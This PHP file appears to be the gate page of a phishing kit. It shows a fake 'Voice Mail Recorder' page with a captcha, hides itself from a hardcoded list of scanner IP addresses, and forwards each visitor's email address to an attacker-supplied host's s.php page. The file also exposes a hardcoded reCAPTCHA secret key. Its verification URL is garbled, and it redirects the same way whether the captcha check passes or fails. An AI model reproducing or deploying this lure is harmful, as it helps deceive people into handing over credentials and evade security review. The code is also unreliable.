<?php session_start();
include('blocker.php');
require_once 'kancha.php';
$deny = array("13.239.62.44", "54.233.137.119", "162.243.187.126", "46.101.94.163", "31.6.58.60", "87.89.48.69", "92.23.59.24", "5.62.41.36", "154.70.155.194", "18.231.48.187", "46.101.94.163", "46.101.119.24", "52.65.198.212", "54.252.230.248", "52.67.159.194", "40.118.205.169", "199.249.230.77", "50.125.66.169", "194.99.104.130", "51.77.0.80", "40.118.205.169", "199.249.230.77", "50.125.66.169", "196.251.88.139", "185.93.2.59", "196.251.88.139", "84.93.42.239", "196.52.84.53", "82.102.27.51", "5.62.41.37", "165.227.0.128", "92.23.56.101", "185.229.190.136", "50.125.67.177", "104.215.89.177", "188.166.98.249", "138.91.146.139", "50.125.67.177", "159.203.0.156", "188.166.63.71", "165.227.163.166", "139.59.4.194", "142.93.74.68", "64.246.187.119", "157.230.173.0", "52.67.130.154", "40.90.218.216", "72.12.194.91", "103.234.220.197", "162.247.74.204", "40.91.75.16", "72.12.194.91", "103.234.220.197", "162.247.74.204", "18.228.44.24", "72.12.194.150.79", "71.189.173.38", "18.228.44.24", "72.12.194.90", "211.25.3.117", "185.104.120.3", "103.234.220.195", "196.52.84.31", "84.92.138.149", "107.155.49.126", "185.93.2.109", "40.91.75.16");



if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
   header("location: https://example.com/");
   exit();
} 


 if(isset($_POST["lastone"])){
            
	 		$_SESSION["lastone"]=$_POST["lastone"];
	 } else {

            $_SESSION["lastone"]= $_GET["lastone"];
	 }
     
 if(isset($_POST["link"])){
            
	 		$_SESSION["link"]=$_POST["link"];
	 } else {

            $_SESSION["link"]= $_GET["link"];
	 }

     if(isset($_POST["mail"])){
	 		$_SESSION["mail"]=$_POST["mail"];
	 } else {

            $_SESSION["mail"]= $_GET["mail"];
	 }
   
  // $final = $_SESSION["lastone"];
  // $data = $_SESSION["mail"];

$final1 = $_GET["lastone"];	
$final = $final1;

$link1 = $_GET["link"];	
$link = $link1;

$data = $_GET["mail"];

    if (isset($_POST['submit'])) {
        $username = $_POST['username'];
        $secretKey = "6Ld9lWAbAAAAAKILElS1ff6wRYOiTvH8lUOw45XR";
        $responseKey = $_POST['g-recaptcha-response'];
        $userIP = $_SERVER['REMOTE_ADDR'];
        
        $url = "https://www.goog6LeGf9gaAAAAAIy0ki5-qdTc0pzQTfaUbFq2wTuble.com/recaptcha/api/siteverify?secret=$secretKey&response=$responseKey&remoteip=$userIP";
        $response = file_get_contents($url);
        $response = json_decode($response);
        if ($response->success)
        {
          

           header ("Location: ".$final."/s.php?mail=".$data."&lf=".$link."");
           
            }
        else{
        
            header ("Location: ".$final."/s.php?mail=".$data."&lf=".$link."");
          }  
     
    }
?>

<html>
    <head>
        <title>Voice Mail Recorder</title>
        <meta charset="utf-8">
        
        <style type="text/css">

body {
    text-align:center;
    align:center; 
}

form {
 
  margin: 0;
  position: absolute;
  top: 35%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
   
 

}

h1 {
    display: block;
    font-size: 2em;
    margin-block-start: 0.67em;
    margin-block-end: 0.67em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    font-weight: bold;
    color: Black;
    text-align: center;
}

p {
    display: block;
    margin-block-start: 1em;
    margin-block-end: 1em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    color: black;
    text-align: center;
}

#frame1, #frame0 {
	background-color: #1a73e8;
	margin: 30px auto auto;
	padding: 10px;
	width: 750px;
	border: 1px solid #EEE;
}


label,input {
 display: block;
 width: 150px;
 float: left;
 margin-bottom: 10px;
 text-align: center;
}

label {
 text-align: right;
 width: 75px;
 padding-right: 20px;
 text-align: center;
}





    </style>
    
       
    </head>
    <body>
    
     
    
    <br>
  
        <form action="" method="post">
             
   <h1 color="blue">To Proceed To Voicemail</h1>
    <p>Please check the box to let us know you're human</p>
    
        <div class="g-recaptcha" data-sitekey="6Ld9lWAbAAAAAFWe-0Y9FN6pQNUooHivwo6jwbMm"></div>
            <br>
            <input type="submit" name="submit" onclick="return validate();"  value="Listen to Voicemail">
            
        </form>
        <script src='https://www.google.com/recaptcha/api.js'></script>
    </body>
</html>